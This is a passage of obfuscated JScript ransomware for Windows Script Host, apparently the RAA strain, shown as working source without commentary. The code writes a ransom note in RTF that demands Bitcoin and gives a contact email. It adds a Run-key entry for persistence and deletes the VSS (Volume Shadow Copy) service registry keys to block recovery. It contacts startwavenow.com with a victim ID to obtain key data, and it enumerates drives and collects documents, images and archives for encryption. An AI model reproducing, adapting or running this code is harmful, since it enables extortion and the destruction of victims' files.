KcGM2MUlNNlRJTUt4enJIaWlKN090ZUtJbmlEaWlhSE9zY0t4dzdmT2s4K0Q0b21sejRNZ3o0UFBnTTYxTENEQ3NjNjFJTUt4NG9tbDRvbWt6cVBQZzgrRzRvaWE0b2llenFZZ3pxYkNzZUtKcGM2MTRvbUl6NGJPcHM2cHpySGlpSjdPcGlET3BpRERuODYwenJIUGdNNjF3ckhpaWFYUGhzNjF6cGdnNG9tbHpxYkNzTTZtejRiT3RjNllPaURPdFN3ZzRvaXBBSDIO0b21oenFiaWpLSE90YzZqenFiaWlhWFBneXdnenFQaWlhSGlpYVRQaE9LQnY4S2dJT0tJbnM2MXpxWXNJT0tKaU9LSnBjNjF3NS9paUpvZzRvbWx6cWJDc002bXo0Yk9zU0RDc2VLSnBjNnh6clRPc1NEUGcrS0ltYytESU1PZnpyVE9zY0sxejRQUGhzK0d6NFBPbUNFZ0RRcmlsWnJEbjg2MUlNS3k0b21senJVZ3c3c2d6NGJPc2NLd3pyRWd6cFBpaUpyQ3NlS0J2eURPcGlEUGhzNnh3ckRPc1NEaWlhSE90YzZqenFiUGhzNnhPaURDc2M2MHpxYkNzTTZwenJYaWlKNGd6cFBpaUpyQ3NjNjF6cW5PdFNEQ3RjNm16clRPcHVLSW1jK0RJTStHenJIQ3NNK0RJTTZtSU0rR3o0UE9vODYxd3JIQ29NK0F6ckhQZytLSW5zNjFJTTZqenJUQ29DRE9rOEt4ejRQaWpLRWd6NGJQZ0tKcE9LSm9jK0d6clVnNG9tbDRvaWFJTU9mNG9HL3o0UENzT0tCdnl3Z3pxYkNzZUtKcGM2MTRvbUl6NGJPcHM2cElPS0pvYzZ4enFQT3RjS3g0b21senFZaElPS1ZxODZ4d3JIaWlhWE90U0RPdGVLSXFlS0pwTUt4NG9tbHpyWENzTTZ4ejRQQ3NPS0J2eURpaWFYaWlKb2d6cW5paWFURG44NjF6cWtzSU1LeDRvbWw0b21oejRQaWlKN0NvTUt4NG9HL0lNK0d6ckhpaUtuT3RjNjB6NGJPcHVLSnBlS0J2eURQZzgrQXpyVWhJQTBLNHBXYUlPS0lxZUtKb2M2bXc1L090TTZtd3JYT3NjS2d3ckhpZ2I4Z3pxa2c0b21sejRQRG44K0RMQ0RDb0NEUGcrS0ltYytESU02anpyWE90TUsxejRQUGhpRFBoczZ4NG9tazRvbUl6cWJpaWFYaWdiNm1JTTYwejRQaWlhWFBoczZtenBnZzRvaXB6clhPdE02ano0UFBodUtCdnlFZ0RRcmlsYWJQZytLSnBjNjFJTTZUSU1LeHpySGlpSjdPdGVLSW5pRGlpYUhPc2NLeHc3Zk9rOCtENG9tbHo0TWd6NFBQZ002MUxDRENzYzYxSU1LeDRvbWw0b21renFQUGc4RDRvbWh6NGJpaWFUT2s4S3d6cWJQZzhLeHdxQWd6clhpaWFVZ3dyWE9wc0d6ckhPb3lEUGhzNm00b2llenFZc0lNS3h6clhDc2MrRHpxUE9waURPdGVLSm9jNjB6ckhpaUo0Z3pxWWd3ckhQaHMrRHo0RGlpYVFzSU1LeHpyWENzYytEenFQT3BpRENzYzYxenJUUGhzTzM0b21rT2lEaWlhWE9zYzZwSU1LMXpxYk9rK0tKcE9LSnBTRGlpSjdPdGMrQTRvbWs0b21JenFiUGd5RE9rOCtENG9tbDRvbWg0b2lhTGcwSzRwV2FJT0tJcWM2MXpxUE90Y09mejRiT3RTRE9rOCtENG9tbDRvbWg0b21rSU1PZjRvbWt6cVBpaWFRZ3pxWWd3cUFnejRiUGc4NnB6clhQZ002anpyRWd3NS9paWFUQ3NNK0R6cFBPc2VLSnBlS0J2eURDc2VLSm9jK0R6cVBPcGlEUGhzNm00b3loSU02bUlNNmo0b21rNG95aHpyWGlpSjRnd3JIT2s4NjF6cWJpaUo0Z3o0VE9zZUtNb2M2VHpySGlpYVhpaUpyT2s4Nng0b21sNG9HL0lNNmo0b2lhNG95aHpySFBoczZtejRNZzRvbWtJTTZqNG9tazRveWh6ckVnenFiaWpLRTZJT0tKcGM2eHpxa2c0b3loenJYaWlZalBnXGNmMFxsYW5nMTBBSDIOzM1xmMVxmczIwXHBhcg0KfQ0KBBSDIOBBSDIO==";
    b64EncodedString = b64EncodedString.replace(/BBSDIO/g, "A");
    var clear_b64EncodedString = CryptoJS.enc.Base64.parse(b64EncodedString);
    var clearedString = clear_b64EncodedString.toString(CryptoJS.enc.Utf8);
    clearedString = clearedString.replace(/BBSDIO/g, "A");
    var AdodbStreamObj = new ActiveXObject('ADODB.Stream');
    var WScriptShellObj = WScript.CreateObject("WScript.shell");
    var _saveFolder = WScriptShellObj.SpecialFolders("MyDocuments");
    _saveFolder = _saveFolder + "\\" + "doc_attached_" + __key;
    AdodbStreamObj.Type = 2;
    AdodbStreamObj.Charset = "437";
    AdodbStreamObj.Open();
    AdodbStreamObj.WriteText(clearedString);
    AdodbStreamObj.SaveToFile(_saveFolder);
    AdodbStreamObj.Close();
    var run = "wordpad.exe " + "\"" + _saveFolder + "\"";
    WScriptShellObj.Run(run);
    return 0;
}


var __arguments = WScript.Arguments;


if (__arguments.length == 0) {
    runShell();
    runRansomware();
} else {
    null;
}


function zQqUzoSxLQ() {
    var QCY;
    var kHkyz = WScript.CreateObject("WScript.Shell");
    try {
        kHkyz.RegRead("HKCU\\RAA\\Raa-fnl\\");
    } catch (e) {
        QCY = 0;
    }
    var lCMTwJKZ = [];
    var baZk = "wscript.exe";
    var AFtKLHIjDtkM = 0;
    var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
    for (; !e.atEnd(); e.moveNext()) {
        var p = e.item();
        lCMTwJKZ = lCMTwJKZ + p.Name + ",";
    }
    lCMTwJKZ = lCMTwJKZ.split(",");
    var jcayrm = -1;
    do {
        jcayrm += 1;
        if (lCMTwJKZ[jcayrm] == baZk) {
            AFtKLHIjDtkM = AFtKLHIjDtkM + 1;
        } else {
            null
        }
    } while (jcayrm < lCMTwJKZ.length);
    if (AFtKLHIjDtkM < 2 && QCY == 0) {
        var TKVUdGUkzCmE = WScript.ScriptFullName;
        TKVUdGUkzCmE = TKVUdGUkzCmE + " argument";
        var qPOGRFfINeNb = WScript.CreateObject("WScript.Shell");
        qPOGRFfINeNb.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", TKVUdGUkzCmE, "REG_SZ");
        HxBG();
    } else {
        null;
    }
    return 0;
}
zQqUzoSxLQ();
////IYpwFLFbF3kfCvrSwArHonIpt9Dfcu0i4rHuG0wRfERVRq6WIBJflnsEjHTeTOQfzzMPNQ2tHJjqyuGSlSPWu7IyzAAWzTYBkO8AmuNhpvys9Ab1Ho9Hg89j7NdVytW11BcpawzwK6rasJP1mvmXczjqeJFvjodyH5s7QkkqxYDP6RSonh7II4Ea41EfeJ0M23HBwdyiRsjHHIx1vEyPDu9eC058VHijoJelKxqld1UGggBbX5Fa3gTcsZqxQX5nnKYUXxoZHpMIjns5bTKwwABVlTYtSHCgm3vIlh5szhZFTnvlkTqU3ozmTp526qhHKQmE9ObZTmbEKbFNbkX0SAINwI79FWt6C0PNjp3246MADz1rHJXCFURA5VNTMpt451d8g9HYTEYXjq2TDel2nYAabdAXoyJqRZOgktp9izITimO9F3cLNvJVAN9MbRxEn2Zjy9sbNUz0zxOzsEyh2BsPi4ItB1ws3v1SeAGgAPVgT5i9s9IUdc9k6ABifytFGgyqW2sgbYXIJnry28AKC7Fa0nVsCQZpV2W2IiFB1fDzZAlAG9wdUIrW0ip9e7ZW5RWAIGQ4oL1VrakZtVgVtm8ouUaPPJSSziZJSN1nvQulRkfnCcQnSz1jTtMJe00qU9QlW4duaWgeU1LTF8UYFsdHCWLEhKkGAaUPWnOpLig4SlSPWuDTuHLWu672RkBRdFk231ibTZroFgZFaFFVBQR7ZSSIqqtUDWfz2Ca3JW6GOvWGTX60nyOQpNsRsQBv4u3OZgX6Bh1GcJfpova6uQXdBw9fm4uA3Wp7b0RDox1IZsaP9XF5JkWeZvTlcGvlscBDkARfJKoHrpJQrFMsZuIvDCNLhWyi4SWSiO6a3RWqcrQuAk3tgpIZhLuC8p2C5XmQ20cBvH3rBePBLwi7uLvhKXDvmFoVg1yctkUAmEg8AdL1KQgUjgC6ieCrHtQAeQ0zPBFZAJvXe8jpRM9NCxh2agUAX2XPb
function HxBG() {
    try {
        uTNMmZ();
    } catch (e) {
        izzU();
    }
    function uTNMmZ() {
        var HKLM = 0x80000002;
        var TkTuwCGFLuv = "SYSTEM\\CurrentControlSet\\services\\VSS";
        var ZTggxbypOSpS = yxTyDP(".", TkTuwCGFLuv);
        var ldranXys = -1;
        next:do {
            ldranXys += 1;
            if (yxTyDP(".", ZTggxbypOSpS[ldranXys]) != 1) {
                var pZhfh = yxTyDP(".", ZTggxbypOSpS[ldranXys]);
                ZTggxbypOSpS = ZTggxbypOSpS.concat(pZhfh);
            } else {
                continue next;
            }
        } while (ldranXys < ZTggxbypOSpS.length - 1);
        function NdpcNJVAPrNj() {
            var EOhUBStfdJi = WScript.CreateObject("WScript.Shell");
            var EtQCVA = ZTggxbypOSpS.length;
            do {
                EtQCVA -= 1;
                ZTggxbypOSpS[EtQCVA] = "HKLM\\" + ZTggxbypOSpS[EtQCVA];
                ZTggxbypOSpS[EtQCVA] = ZTggxbypOSpS[EtQCVA] + "\\";
                var aa = EOhUBStfdJi.RegDelete(ZTggxbypOSpS[EtQCVA]);
            } while (EtQCVA > 0);
            var bb = EOhUBStfdJi.RegDelete("HKLM\\SYSTEM\\CurrentControlSet\\services\\VSS\\");
            return 0;
        }

        NdpcNJVAPrNj();
        function yxTyDP(strComputer, strRegPath) {
            var oRd = null;
            var OHUpAAspilT = new ActiveXObject("WbemScripting.SWbemLocator");
            var rXRUTkui = OHUpAAspilT.ConnectServer(strComputer, "root\\default");
            var scSqs = rXRUTkui.Get("StdRegProv");
            var GqGcF = scSqs.Methods_.Item("EnumKey");
            var FsAp = GqGcF.InParameters.SpawnInstance_();
            FsAp.hDefKey = HKLM;
            FsAp.sSubKeyName = strRegPath;
            var vriZz = scSqs.ExecMethod_(GqGcF.Name, FsAp);
            switch (vriZz.ReturnValue) {
                case 0:
                    oRd = (vriZz.sNames != null) ? vriZz.sNames.toArray() : 1;
                    var RSxfFZsaPX = -1;
                    do {
                        RSxfFZsaPX += 1;
                        oRd[RSxfFZsaPX] = strRegPath + "\\" + oRd[RSxfFZsaPX];
                    } while (RSxfFZsaPX < oRd.length - 1);
                    break;
                case 2:
                    oRd = null;
                    break;
            }
            return oRd;
        }

        izzU();
        return 0;
    }

    return 0;
}
////ea0SagIcbAfUeKRUMVY4oPtLhHBYXpFevY7FgKCBFwziAElTwxwm938vvWZV2JgxWG8xkHFsfH4EvM6TdYT1ENzTQzqAhB5FjsVHq4pinFLs3u6vFQbbQF45ZhK3AecsMwImzvMKqgeGI1UchodvD56cDy7QNVbv6QlxQ0Qjap3DQaF2XCW9WDAWy8xv3wpc1sJUGwILzzlbmEBqZYwVYRNx9HLRRtI5NtibDWbC5fROIihpn2awb1fDWaxINJ6DgpUsjfKT3jfuVNqoWgjtLerHkWCeTsXuvjbAKh1BZydJy0X6qb2SEt4lhc6Cf0XSBYRq4pEJRsEUxq7wEEbeDkE0GMSzzrIJMdtGXqFvOeFzHx7QYwH6gZwSLC9eZxCwHN
function izzU() {
    var FknDierotSzK = new ActiveXObject("Scriptlet.TypeLib");
    var cVjZujcP = FknDierotSzK.GUID.substr(1, 36);

    function get_HZtSmFNRdJM() {
        var VuSD = cVjZujcP + " - RAA";
        var MOSKn = [];
        MOSKn[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + VuSD;
        var req = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
        var QSJCTxMMl = 15000;
        var bFPwcaPNy = 15000;
        var zarI = 15000;
        var olWVonsDzH = 15000;
        req.setTimeouts(QSJCTxMMl, bFPwcaPNy, zarI, olWVonsDzH);
        var pointer_MOSKn = -1;
        var aka;
        do {
            pointer_MOSKn += 1;
            if (pointer_MOSKn <= 0) {
                pointer_MOSKn = pointer_MOSKn;
            } else {
                pointer_MOSKn = 0;
                WScript.Sleep(60000);
            }
            try {
                req.open("GET", MOSKn[pointer_MOSKn], false);
                req.send();
                aka = req.responseText.split(',');
            } catch (e) {
                aka = 0;
            }
        } while (aka == 0);
        return aka;
    }

    var KrvABjTTXNS = [];
    KrvABjTTXNS = get_HZtSmFNRdJM();
    var VKw = KrvABjTTXNS[0];
    var jOnaTnksWb = KrvABjTTXNS[1];
////Vj90iFSoMPdIS9uDnf7aG07nmqgw3uBzGW0OnDuFgtNuBF6fGGzdE18cc8Kx4vgPCBvdfYvyJ0nDQhf2pK7FrYHXuMA1jZE7GCW1SNglwayHcqXCJUj7mBgZ64yE6YUHYJQvQjtGrCzxleB5lFSXL5zRjhc4kVXy8vXtl2HjWXlDpDlQfUbkXX1R752qBMx8RZYFVeS0Jz2dHLQqB9rW4ddWCAOLUHJeZpbhrepoXajBqVq8oB71kIrkl6ThNZst6LJMg2u8o8REhy8sEjYq8QJnoPPcE7cJ473uE2q7SXIqcHsBKc3OQSrvEaXfhlJQ7AM77j8tOWvIhsRkfylTX2S2hld1DF5z2HiVeqky5Rqr4yaEwFz3U4I5rnLH762PR6WKHwFdvQvnzpIjuMHU5qFefUkig5GRlRKmKiQjfpHh82pbUBohiaSp76QZdd35StKU3a0fFlCtEI5Y2DzsW9FL96VlseIoTb59pciZq4XNmG8x2XIHl2HwjCCoJaDz0MXZiVTw7OFgAk6KryQJTZtyLbOt8hLXNvDr95zDma9G06DBtbarIOpIaUbLDchqNciq1nStJNyzcv88sPDuaE1K8o7Eq7D1e4SqoZcj5ChrwuX6YEjKspqVrGTJa9VEPNgaC12EaK5AW6wxQzj1R9PqEa67Y9nTUMeSkfaOwJSaqEnHs5GD9xGp02ESla5QTC9vybCgkakrvPnPZ8V3fRGV
    function kth() {
        var DmYbWSaT, s, n, e, sNaZfrOWc;
        DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
        e = new Enumerator(DmYbWSaT.Drives);
        s = [];
        RKsqOBz:   for (; !e.atEnd(); e.moveNext()) {
            sNaZfrOWc = e.item();
            if (sNaZfrOWc.IsReady) {
                sNaZfrOWc = sNaZfrOWc += "\\\\";
                s.push(sNaZfrOWc);
            } else          continue RKsqOBz;
        }
        return (s);
    }

    function HHiAp(TkTuwCGFLuv) {
        var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
        var kCcui = DmYbWSaT.GetFolder(TkTuwCGFLuv);
        var dBMsgV = new Enumerator(kCcui.SubFolders);
        var kCcui_list = "";
        var Mzorw = "WINDOWS";
        var HWgKzDUQd = "RECYCLER";
        var zmVQlcBlJ = "Program Files";
        var OCSJUFRoHQVQ = "Program Files (x86)";
        var TpLTLOLP = "Windows";
        var oWxWruNtMZmL = "Recycle.Bin";
        var mOGye = "RECYCLE.BIN";
        var LSTk = "Recycler";
        var RQNcs = "TEMP";
        var Mzorw0 = "APPDATA";
        var Mzorw1 = "AppData";
        var Mzorw2 = "Temp";
        var Mzorw3 = "ProgramData";
        var Mzorw4 = "Microsoft";
        for (; !dBMsgV.atEnd(); dBMsgV.moveNext()) {
            if (dBMsgV.item() == 0) {
                null;
            } else {
                if (String(dBMsgV.item()).indexOf(Mzorw) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(HWgKzDUQd) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(zmVQlcBlJ) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(OCSJUFRoHQVQ) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(TpLTLOLP) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(oWxWruNtMZmL) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(mOGye) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(LSTk) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(RQNcs) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(Mzorw0) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(Mzorw1) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(Mzorw2) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(Mzorw3) >= 0) {
                    null;
                } else if (String(dBMsgV.item()).indexOf(Mzorw4) >= 0) {
                    null;
                } else {
                    kCcui_list += dBMsgV.item();
                    kCcui_list += __key;
                }
            }
        }
        return (kCcui_list);
    }

    function LMz(TkTuwCGFLuv) {
        var WwltLWmsVwv = new ActiveXObject("Scripting.FileSystemObject");
        var IMhT = WwltLWmsVwv.GetFolder(TkTuwCGFLuv);
        var col_IMhT = new Enumerator(IMhT.Files);
        var IMhT_list = "";
        var kIsVkdBFbJ = ".doc";
        var YgArYNboS = ".xls";
        var CCOyZJ = ".rtf";
        var bAaa = ".pdf";
        var tOgTFO = ".dbf";
        var NijiLSgfjX = ".jpg";
        var Xhmb = ".dwg";
        var VwobvZiwDcyN = ".cdr";
        var HErxpbpJud = ".psd";
        var kIsVkdBFbJ0 = ".cd";
        var kIsVkdBFbJ1 = ".mdb";
        var kIsVkdBFbJ2 = ".png";
        var kIsVkdBFbJ3 = ".lcd";
        var kIsVkdBFbJ4 = ".zip";
        var kIsVkdBFbJ5 = ".rar";
        var kIsVkdBFbJ6 = ".locked";
        var kIsVkdBFbJ7 = "~";
        var kIsVkdBFbJ8 = "$";
        var kIsVkdBFbJ9 = "csv";
        for (; !col_IMhT.atEnd(); col_IMhT.moveNext()) {
            if (col_IMhT.item() == 0) {
                null;
            } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ6) >= 0) {
                null;
            } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ7) >= 0) {
                null;
            } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ8) >= 0) {
                null;
            } else {
                if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(YgArYNboS) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(CCOyZJ) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(bAaa) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(tOgTFO) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(NijiLSgfjX) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(Xhmb) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(VwobvZiwDcyN) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(HErxpbpJud) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ0) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ1) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ2) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ3) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ4) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ5) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ9) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else {
                    null;
                }
            }
        }
        return (IMhT_list);
    }

    function OFTEml(array_to_clean) {
        var pjvsEz = new Array();
        for (var i = 0; i < array_to_clean.length; i++) {
            if (array_to_clean[i]) {
                pjvsEz.push(array_to_clean[i]);
            }
        }
        return pjvsEz;
    }

    var kAgTDYi = [];
    kAgTDYi[0] = kth();
    function VGCDtihB() {
        var rftKZajp = "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CdlMlwnZWFcJ2U4IFwnZjRcJ2UwXCdlOVwnZWJcJ2VlXCdlMi5cY2YwXGIwXGZzMjBccGFyDQpcYlxmczI0IDVcZnMyMCRAASEPuXGIwICBcJ2NmXCdmMFwnZTVcJ2U0XCdlZlwnZjBcJ2U4XCdlZFwnZmZcJ2YyXCdmYyBcJ2VjXCdlNVwnZjBcJ2ZiIFwnZWZcJ2VlIFwnZWZcJ2YwXCdlNVwnZTRcJ2VlXCdmMlwnZTJcJ2YwXCdlMFwnZjlcJ2U1XCdlZFwnZThcJ2ZlIFwnZWZcJ2VlXCdlNFwnZWVcJ2UxXCdlZFwnZmJcJ2Y1IFwnZjFcJ2U4XCdmMlwnZjNcJ2UwXCdmNlwnZThcJ2U5IFwnZTIgXCdlNFwnZTBcJ2ViXCdmY1wnZWRcJ2U1XCdlOVwnZjhcJ2U1XCdlYy5ccGFyDQpccGFyDQpcY2YxXGJcZnMyNFwnYzJcJ2UwXCdlNlwnZWRcJ2VlICgxKS5cY2YwXGIwXGZzMjBccGFyDQpcJ2NkXCdlNSBcJ2VmXCdmYlwnZjJcJ2UwXCdlOVwnZjJcJ2U1XCdmMVwnZmMgXCdlZlwnZWVcJ2U0XCdlZVwnZTFcJ2YwXCdlMFwnZjJcJ2ZjIFwnZWFcJ2ViXCdmZVwnZjcsIFwnZmRcJ2YyXCdlZSBcJ2UxXCdlNVwnZjFcJ2VmXCdlZVwnZWJcJ2U1XCdlN1wnZWRcJ2VlLCBcJ2U4IFwnZWNcJ2VlXCdlNlwnZTVcJ2YyIFwnZjNcJ2VkXCdlOFwnZjdcJ2YyXCdlZVwnZTZcJ2U4XCdmMlwnZmMgXCdlMlwnZTBcJ2Y4XCdlOCBcJ2U0XCdlMFwnZWRcJ2VkXCdmYlwnZTUgXCdlZVwnZWFcJ2V